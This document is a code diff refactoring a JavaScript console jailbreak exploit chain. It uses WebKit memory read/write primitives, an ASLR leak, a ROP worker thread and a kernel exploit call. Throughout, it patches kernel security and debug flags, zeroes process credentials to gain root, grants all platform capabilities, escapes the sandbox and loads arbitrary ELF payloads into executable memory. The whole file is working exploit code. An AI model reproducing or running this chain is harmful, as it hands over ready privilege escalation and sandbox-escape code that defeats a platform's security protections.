@@ -425,8 +425,48 @@ let nogc = [];
 
 let worker = new Worker("rop_slave.js");
 
-function find_worker() {
+//Make sure worker is alive?
+async function wait_for_worker() {
+    let p1 = await new Promise((resolve) => {
+        const channel = new MessageChannel();
+        channel.port1.onmessage = () => {
+            channel.port1.close();
+            resolve(1);
+        }
+        worker.postMessage(0, [channel.port2]);
+    });
+    return p1;
+}
 
+/**
+ * @param {UserlandRW|WebkitPrimitives} p 
+ * @param {int64} buf 
+ * @param {number} family 
+ * @param {number} port 
+ * @param {number} addr 
+ */
+function build_addr(p, buf, family, port, addr) {
+    p.write1(buf.add32(0x00), 0x10);
+    p.write1(buf.add32(0x01), family);
+    p.write2(buf.add32(0x02), port);
+    p.write4(buf.add32(0x04), addr);
+}
+
+/** 
+ * @param {number} port
+ * @returns {number}
+ */
+function htons(port) {
+    return ((port & 0xFF) << 8) | (port >>> 8);
+}
+
+
+/**
+ * @param {UserlandRW|WebkitPrimitives} p 
+ * @param {int64} libKernelBase 
+ * @returns 
+ */
+function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
     const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
@@ -438,43 +478,54 @@ function find_worker() {
             return stack;
         }
     }
-    alert("failed to find worker.");
+    throw new Error("failed to find worker.");
 }
 
-function htons(port) {
-    return ((port & 0xFF) << 8) | (port >>> 8);
-}
-function build_addr(buf, family, port, addr) {
-    p.write1(buf.add32(0x00), 0x10);
-    p.write1(buf.add32(0x01), family);
-    p.write2(buf.add32(0x02), port);
-    p.write4(buf.add32(0x04), addr);
-}
 
-    const AF_INET      = 2;
-    const AF_INET6     = 28;
-    const SOCK_STREAM  = 1;
-    const SOCK_DGRAM   = 2;
-    const IPPROTO_UDP  = 17;
-    const IPPROTO_IPV6 = 41;
-    const IPV6_PKTINFO        = 46;
-    
-async function userland() {
+/**
+ * @enum {number}
+ */
+const LogLevel = {
+    DEBUG: 0,
+    INFO: 1,
+    LOG: 2,
+    WARN: 3,
+    ERROR: 4,
+    SUCCESS: 5,
+
+    FLAG_TEMP: 0x1000,
+};
+
+const AF_INET = 2;
+const AF_INET6 = 28;
+const SOCK_STREAM = 1;
+const SOCK_DGRAM = 2;
+const IPPROTO_UDP = 17;
+const IPPROTO_IPV6 = 41;
+const IPV6_PKTINFO = 46;
+
+
+/**
+ * @param {UserlandRW} p 
+ * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
+ */
+async function prepare(p) {
     //ASLR defeat patsy (former vtable buddy)
     let textArea = document.createElement("textarea");
 
     //pointer to vtable address
     let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+
     //address of vtable
     let textAreaVtable = p.read8(textAreaVtPtr);
-    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
-    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
-    //debug_log("webkit base: 0x" + libSceNKWebKitBase);
 
-    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
+    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
+    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+
+    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
     libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
 
-    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
+    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
     libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
 
     let gadgets = {};
@@ -493,45 +544,42 @@ async function userland() {
         let backing;
         backing = new Uint8Array(sz);
         nogc.push(backing);
+        /** @type {any} */
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
 
+    /**
+     * @param {number} sz 
+     * @param {number} type 
+     * @returns 
+     */
     function malloc(sz, type = 4) {
         let backing;
         if (type == 1) {
-            backing = new Uint8Array(0x10000 + sz);
+            backing = new Uint8Array(1000 + sz);
         } else if (type == 2) {
-            backing = new Uint16Array(0x10000 + sz);
+            backing = new Uint16Array(0x2000 + sz);
         } else if (type == 4) {
             backing = new Uint32Array(0x10000 + sz);
         }
         nogc.push(backing);
+        /** @type {any} */
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
 
     function array_from_address(addr, size) {
-        let og_array = new Uint32Array(0x1000);
+        let og_array = new Uint8Array(1001);
         let og_array_i = p.leakval(og_array).add32(0x10);
 
-        p.write8(og_array_i, addr);
-        p.write4(og_array_i.add32(0x8), size);
-        p.write4(og_array_i.add32(0xC), 0x1);
-
-        nogc.push(og_array);
-        return og_array;
-    }
-
-    function u8array_from_address(addr, size) {
-        let og_array = new Uint8Array(0x10000 + size);
-        let og_array_i = p.leakval(og_array).add32(0x10);
-
-        p.write8(og_array_i, addr);
-        p.write4(og_array_i.add32(0x8), size);
-        p.write4(og_array_i.add32(0xC), 0x1);
+        function setAddr(newAddr, size) {
+            p.write8(og_array_i, newAddr);
+            p.write4(og_array_i.add32(0x8), size);
+            p.write4(og_array_i.add32(0xC), 0x1);
+        }
 
         setAddr(addr, size);
 
@@ -547,15 +595,17 @@ async function userland() {
         for (let i = 0; i < str.length; i++) {
             bufView[i] = str.charCodeAt(i) & 0xFF;
         }
-        nogc.push(bufView);
+        // nogc.push(bufView);
+        /** @type {any} */
         let ptr = p.read8(p.leakval(bufView).add32(0x10));
         ptr.backing = bufView;
         return ptr;
     }
 
-    function readstr(addr) {
+    function readstr(addr, maxlen = -1) {
         let str = "";
         for (let i = 0; ; i++) {
+            if (maxlen != -1 && i >= maxlen) { break; }
             let c = p.read1(addr.add32(i));
             if (c == 0x0) {
                 break;
@@ -582,22 +632,25 @@ async function userland() {
         p.write1(waddr, 0x0);
     }
 
-//Make sure worker is alive?
-async function wait_for_worker() {
-    let p1 = await new Promise((resolve) => {
-        const channel = new MessageChannel();
-        channel.port1.onmessage = () => {
-            channel.port1.close();
-            resolve(1);
-        }
-        worker.postMessage(0, [channel.port2]);
-    });
-    return p1;
-}
+    // Make sure worker is alive?
+    async function wait_for_worker() {
+        let p1 = await new Promise((resolve) => {
+            const channel = new MessageChannel();
+            channel.port1.onmessage = () => {
+                channel.port1.close();
+                resolve(1);
+            }
+            worker.postMessage(0, [channel.port2]);
+        });
+        return p1;
+    }
 
+    let worker = new Worker("rop_slave.js");
+    
     await wait_for_worker();
-    let worker_stack = find_worker();
-    let original_context = p.malloc(0x40);
+
+    let worker_stack = find_worker(p, libKernelBase);
+    let original_context = malloc(0x40);
 
     let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
     let original_return_address = p.read8(return_address_ptr);
@@ -633,8 +686,7 @@ async function wait_for_worker() {
             worker.postMessage(0, [channel.port2]);
         });
         if (p1 === 0) {
-            alert("The rop thread ran away. ");
-            p.write8(0, 0);
+            throw new Error("The rop thread ran away. ");
         }
     }
 
@@ -677,129 +729,31 @@ async function wait_for_worker() {
     return { p: p2, chain: chain };
 }
 
-    var krw = await runUmtx2Exploit(p, chain, log);
+async function main(userlandRW) {
+    const debug = false;
 
-    function get_kaddr(offset) {
-        return krw.kbase.add32(offset);
-    }
+    const { p, chain } = await prepare(userlandRW);
+    if (debug) debug_log("Chain initialized", LogLevel.DEBUG);
 
-    // Set security flags
-    let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
-    await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
-
-    // Set targetid to DEX
-    await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
-    // Patch PS4 SDK version  
-    await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
-    
-    // Set qa flags and utoken flags for debug menu enable
-    let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
-    await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
-
-    let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
-    await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
-    //showMessage("Debug setting enabled"),
-    //debug_log("[+] enabled debug menu");
-
-    // Patch creds
-    let cur_uid = await chain.syscall(SYS_GETUID);
-    debug_log("[+] escalating creds (current uid=0x" + cur_uid + ")");
-
-    await krw.write4(proc_ucred_addr.add32(0x04), 0); // cr_uid
-    await krw.write4(proc_ucred_addr.add32(0x08), 0); // cr_ruid
-    await krw.write4(proc_ucred_addr.add32(0x0C), 0); // cr_svuid
-    await krw.write4(proc_ucred_addr.add32(0x10), 1); // cr_ngroups
-    await krw.write4(proc_ucred_addr.add32(0x14), 0); // cr_rgid
-
-    // Escalate sony privs
-    await kernel_write8(proc_ucred_addr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
-    await kernel_write8(proc_ucred_addr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
-    await kernel_write8(proc_ucred_addr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
-    await kernel_write1(proc_ucred_addr.add32(0x83), 0x80);                              // cr_sceAttr[0]
-
-    // Remove dynlib restriction
-    let proc_pdynlib_offset = curproc_addr.add32(0x3E8);
-    let proc_pdynlib_addr = await kernel_read8(proc_pdynlib_offset);
-
-    let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
-    await krw.write4(restrict_flags_addr, 0);
-
-    let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
-    await krw.write8(libkernel_ref_addr, new int64(1, 0));
-
-    cur_uid = await chain.syscall(SYS_GETUID);
-    debug_log("[+] we root now? uid=0x" + cur_uid);
-
-    // Escape sandbox
-    let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-    showMessage("Jailbreaking in sandbox"),
-    debug_log("[+] jailbreaking (in sandbox: " + is_in_sandbox + ")");
-    let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
-    await krw.write8(proc_fd_addr.add32(0x10), rootvnode); // fd_rdir
-    await krw.write8(proc_fd_addr.add32(0x18), rootvnode); // fd_jdir
-
-    is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-    debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
-   
-    ///////////////////////////////////////////////////////////////////////
-    // Stage 6: loader
-    ///////////////////////////////////////////////////////////////////////
-
-    let dlsym_addr = syscalls[SYS_DYNLIB_DLSYM];
-    let jit_handle_store = p.malloc(0x4);
-    let test_store_buf   = p.malloc(0x4);
-
-    // ELF sizes and offsets
-    let SIZE_ELF_HEADER = 0x40;
-    let SIZE_ELF_PROGRAM_HEADER = 0x38;
-
-    let OFFSET_ELF_HEADER_ENTRY = 0x18;
-    let OFFSET_ELF_HEADER_PHOFF = 0x20;
-    let OFFSET_ELF_HEADER_PHNUM = 0x38;
-
-    let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
-    let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
-    let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
-    let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
-    let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;
-
-    let OFFSET_RELA_OFFSET = 0x00;
-    let OFFSET_RELA_INFO = 0x08;
-    let OFFSET_RELA_ADDEND = 0x10;
-
-    // ELF program header types
-    let ELF_PT_LOAD = 0x01;
-    let ELF_PT_DYNAMIC = 0x02;
-
-    // ELF dynamic table types
-    let ELF_DT_NULL = 0x00;
-    let ELF_DT_RELA = 0x07;
-    let ELF_DT_RELASZ = 0x08;
-    let ELF_DT_RELAENT = 0x09;
-    let ELF_R_AMD64_RELATIVE = 0x08;
-
-    // ELF parsing
-    let conn_ret_store = p.malloc(0x8);
-
-    let elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000;
-    let elf_store = p.malloc(elf_store_size);
-
-    let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
-    let mapping_addr = new int64(0x26100000, 0x00000009);
-
-    let elf_program_headers_offset = 0;
-    let elf_program_headers_num = 0;
-
-    async function load_payload_into_elf_store_from_local_file(filename) {
-        //showMessage("Loading elf loader"),
-        debug_log("[+] loading ELF file: " + filename + " ...")
-        const response = await fetch(filename);
+    var load_payload_into_elf_store_from_local_file = async function (filename) {
+        debug_log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
+        const response = await fetch('payloads/' + filename);
         if (!response.ok) {
             throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
         }
 
         const data = await response.arrayBuffer();
-        const byteArray = new Uint32Array(data);
+
+        let byteArray;
+        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
+            byteArray = new Uint8Array(data);
+        } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
+            byteArray = new Uint16Array(data);
+        } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
+            byteArray = new Uint32Array(data);
+        } else {
+            throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
+        }
 
         // zero out elf_store.backing
         elf_store.backing.fill(0);
@@ -808,205 +762,326 @@ async function wait_for_worker() {
         return byteArray.byteLength;
     }
 
-    async function parse_elf_store(total_sz = -1) {
-        // Parse header
-        // These are global variables
-        elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
-        elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
-        elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
+    let SIZE_ELF_HEADER = 0x40;
+    let SIZE_ELF_PROGRAM_HEADER = 0x38;
+    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000; // 16MB
+    var elf_store = p.malloc(elf_store_size, 1);
 
-        if (elf_program_headers_offset != 0x40) {
-            debug_log("[!] ELF header malformed, terminating connection.");
-            throw new Error("ELF header malformed, terminating connection.");
+        var krw = await runUmtx2Exploit(p, chain, log);
+
+        function get_kaddr(offset) {
+            return krw.ktextBase.add32(offset);
         }
 
-        //debug_log("[+] parsing ELF file (" + total_sz.toString(10) + " bytes)...");
+        // Set security flags
+        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
+        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
 
-        let text_segment_sz = 0;
-        let data_segment_sz = 0;
-        let rela_table_offset = 0;
-        let rela_table_count = 0;
-        let rela_table_size = 0;
-        let rela_table_entsize = 0;
-        let shadow_write_mapping = 0;
+        // Set targetid to DEX
+        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
 
-        // Parse program headers and map segments
-        for (let i = 0; i < elf_program_headers_num; i++) {
-            let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
+        // Set qa flags and utoken flags for debug menu enable
+        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
+        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
 
-            let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
-            let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
-            let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
-            let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
-            let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
-            let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;
+        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
+        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
+        debug_log("Enabled debug menu", LogLevel.INFO);
 
-            if (program_type == ELF_PT_LOAD) {
-                // For executable segments, we need to take some care and do alias'd mappings.
-                // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
-                if ((program_flags & 1) == 1) {
-                    // Executable segment
-                    text_segment_sz = program_memsz;
+        // Patch creds
+        let cur_uid = await chain.syscall(SYS_GETUID);
+        debug_log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);
 
-                    // Get exec
-                    await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
-                    await chain.run();
-                    let exec_handle = p.read4(jit_handle_store);
+        await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
+        await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
+        await krw.write4(krw.procUcredAddr.add32(0x0C), 0); // cr_svuid
+        await krw.write4(krw.procUcredAddr.add32(0x10), 1); // cr_ngroups
+        await krw.write4(krw.procUcredAddr.add32(0x14), 0); // cr_rgid
 
-                    // Get write alias
-                    await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
-                    await chain.run();
-                    let write_handle = p.read4(jit_handle_store);
+        // Escalate sony privs
+        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
+        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
+        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
+        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);                              // cr_sceAttr[0]
 
-                    // Map to shadow mapping
-                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
-                    await chain.run();
-                    shadow_write_mapping = p.read8(conn_ret_store);
+        // Remove dynlib restriction
+        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
+        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);
 
-                    // Copy in segment data
-                    let dest = p.read8(conn_ret_store);
-                    for (let j = 0; j < program_memsz; j += 0x8) {
-                        let src_qword = p.read8(elf_store.add32(program_offset + j));
-                        p.write8(dest.add32(j), src_qword);
+        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
+        await krw.write4(restrict_flags_addr, 0);
+
+        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
+        await krw.write8(libkernel_ref_addr, new int64(1, 0));
+
+        cur_uid = await chain.syscall(SYS_GETUID);
+        debug_log("We root now? uid=0x" + cur_uid, LogLevel.INFO);
+
+        // Escape sandbox
+        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
+        debug_log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
+        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
+        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
+        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir
+
+        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
+        debug_log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);
+
+        // Patch PS4 SDK version
+        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
+            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
+            debug_log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
+        }
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 6: loader
+        ///////////////////////////////////////////////////////////////////////
+
+        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
+        let jit_handle_store = p.malloc(0x4);
+        // let test_store_buf   = p.malloc(0x4);
+
+        // ELF sizes and offsets
+
+        let OFFSET_ELF_HEADER_ENTRY = 0x18;
+        let OFFSET_ELF_HEADER_PHOFF = 0x20;
+        let OFFSET_ELF_HEADER_PHNUM = 0x38;
+
+        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
+        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
+        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
+        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
+        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;
+
+        let OFFSET_RELA_OFFSET = 0x00;
+        let OFFSET_RELA_INFO = 0x08;
+        let OFFSET_RELA_ADDEND = 0x10;
+
+        // ELF program header types
+        let ELF_PT_LOAD = 0x01;
+        let ELF_PT_DYNAMIC = 0x02;
+
+        // ELF dynamic table types
+        let ELF_DT_NULL = 0x00;
+        let ELF_DT_RELA = 0x07;
+        let ELF_DT_RELASZ = 0x08;
+        let ELF_DT_RELAENT = 0x09;
+        let ELF_R_AMD64_RELATIVE = 0x08;
+
+        // ELF parsing
+        var conn_ret_store = p.malloc(0x8);
+
+        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
+        let mapping_addr = new int64(0x26100000, 0x00000009);
+
+        let elf_program_headers_offset = 0;
+        let elf_program_headers_num = 0;
+        let elf_entry_point = 0;
+
+        var parse_elf_store = async function (total_sz = -1) {
+            // Parse header
+            // These are global variables
+            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
+            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
+            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
+
+            if (elf_program_headers_offset != 0x40) {
+                debug_log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
+                throw new Error("ELF header malformed, terminating connection.");
+            }
+
+            //debug_log("parsing ELF file (" + total_sz.toString(10) + " bytes)...");
+
+            let text_segment_sz = 0;
+            let data_segment_sz = 0;
+            let rela_table_offset = 0;
+            let rela_table_count = 0;
+            let rela_table_size = 0;
+            let rela_table_entsize = 0;
+            /** @type {int64} */
+            let shadow_write_mapping = 0;
+
+            // Parse program headers and map segments
+            for (let i = 0; i < elf_program_headers_num; i++) {
+                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
+
+                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
+                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
+                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
+                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
+                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
+                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;
+
+                if (program_type == ELF_PT_LOAD) {
+                    // For executable segments, we need to take some care and do alias'd mappings.
+                    // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
+                    if ((program_flags & 1) == 1) {
+                        // Executable segment
+                        text_segment_sz = program_memsz;
+
+                        // Get exec
+                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
+                        await chain.run();
+                        let exec_handle = p.read4(jit_handle_store);
+
+                        // Get write alias
+                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
+                        await chain.run();
+                        let write_handle = p.read4(jit_handle_store);
+
+                        // Map to shadow mapping
+                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
+                        await chain.run();
+                        shadow_write_mapping = p.read8(conn_ret_store);
+
+                        // Copy in segment data
+                        let dest = p.read8(conn_ret_store);
+                        for (let j = 0; j < program_memsz; j += 0x8) {
+                            let src_qword = p.read8(elf_store.add32(program_offset + j));
+                            p.write8(dest.add32(j), src_qword);
+                        }
+
+                        // Map executable segment
+                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
+                        await chain.run();
+                    } else {
+                        // Regular data segment
+                        // data_mapping_addr = mapping_addr.add32(program_vaddr);
+                        data_segment_sz = aligned_memsz;
+
+                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
+                        await chain.run();
+
+                        // Copy in segment data
+                        let dest = mapping_addr.add32(program_vaddr);
+                        for (let j = 0; j < program_memsz; j += 0x8) {
+                            let src_qword = p.read8(elf_store.add32(program_offset + j));
+                            p.write8(dest.add32(j), src_qword);
+                        }
                     }
+                }
 
-                    // Map executable segment
-                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
-                    await chain.run();
-                } else {
-                    // Regular data segment
-                    data_mapping_addr = mapping_addr.add32(program_vaddr);
-                    data_segment_sz = aligned_memsz;
+                if (program_type == ELF_PT_DYNAMIC) {
+                    // Parse dynamic tags, the ones we truly care about are rela-related.
+                    for (let j = 0x00; ; j += 0x10) {
+                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
+                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));
 
-                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
-                    await chain.run();
+                        // DT_NULL means we reached the end of the table
+                        if (d_tag == ELF_DT_NULL || j > 0x100) {
+                            break;
+                        }
 
-                    // Copy in segment data
-                    let dest = mapping_addr.add32(program_vaddr);
-                    for (let j = 0; j < program_memsz; j += 0x8) {
-                        let src_qword = p.read8(elf_store.add32(program_offset + j));
-                        p.write8(dest.add32(j), src_qword);
+                        switch (d_tag) {
+                            case ELF_DT_RELA:
+                                rela_table_offset = d_val.low;
+                                break;
+                            case ELF_DT_RELASZ:
+                                rela_table_size = d_val.low;
+                                break;
+                            case ELF_DT_RELAENT:
+                                rela_table_entsize = d_val.low;
+                                break;
+                        }
                     }
                 }
             }
 
-            if (program_type == ELF_PT_DYNAMIC) {
-                // Parse dynamic tags, the ones we truly care about are rela-related.
-                for (let j = 0x00; ; j += 0x10) {
-                    let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
-                    let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));
+            // Process relocations if they exist
+            if (rela_table_offset != 0) {
+                let base_address = 0x1000;
 
-                    // DT_NULL means we reached the end of the table
-                    if (d_tag == ELF_DT_NULL || j > 0x100) {
-                        break;
+                // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
+                // The linker script should guarantee it ends up in the first LOAD segment (code).
+                rela_table_offset += base_address;
+
+                // Rela count can be gotten from dividing the table size by entry size
+                rela_table_count = rela_table_size / rela_table_entsize;
+
+                // Parse relocs and apply them
+                for (let i = 0; i < rela_table_count; i++) {
+                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                        OFFSET_RELA_OFFSET));
+                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                        OFFSET_RELA_INFO));
+                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
+                        OFFSET_RELA_ADDEND));
+
+                    let reloc_addr = mapping_addr.add32(r_offset.low);
+
+                    // If the relocation falls in the executable section, we need to redirect the write to the
+                    // writable shadow mapping or we'll crash
+                    if (r_offset.low <= text_segment_sz) {
+                        reloc_addr = shadow_write_mapping.add32(r_offset.low);
                     }
 
-                    switch (d_tag) {
-                        case ELF_DT_RELA:
-                            rela_table_offset = d_val.low;
-                            break;
-                        case ELF_DT_RELASZ:
-                            rela_table_size = d_val.low;
-                            break;
-                        case ELF_DT_RELAENT:
-                            rela_table_entsize = d_val.low;
-                            break;
+                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
+                        let reloc_value = mapping_addr.add32(r_addend.low); // B + A
+                        p.write8(reloc_addr, reloc_value);
                     }
                 }
             }
         }
 
-        // Process relocations if they exist
-        if (rela_table_offset != 0) {
-            let base_address = 0x1000;
+        // reuse these plus we can more easily access them
+        let rwpair_mem = p.malloc(0x8);
+        let test_payload_store = p.malloc(0x8);
+        let pthread_handle_store = p.malloc(0x8);
+        let pthread_value_store = p.malloc(0x8);
+        let args = p.malloc(0x8 * 6);
 
-            // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
-            // The linker script should guarantee it ends up in the first LOAD segment (code).
-            rela_table_offset += base_address;
+        var execute_elf_store = async function () {
+            // zero out the buffers defined above
+            p.write8(rwpair_mem, 0);
+            p.write8(rwpair_mem.add32(0x4), 0);
+            p.write8(test_payload_store, 0);
+            p.write8(pthread_handle_store, 0);
+            p.write8(pthread_value_store, 0);
+            for (let i = 0; i < 0x8 * 6; i++) {
+                p.write1(args.add32(i), 0);
+            }
 
-            // Rela count can be gotten from dividing the table size by entry size
-            rela_table_count = rela_table_size / rela_table_entsize;
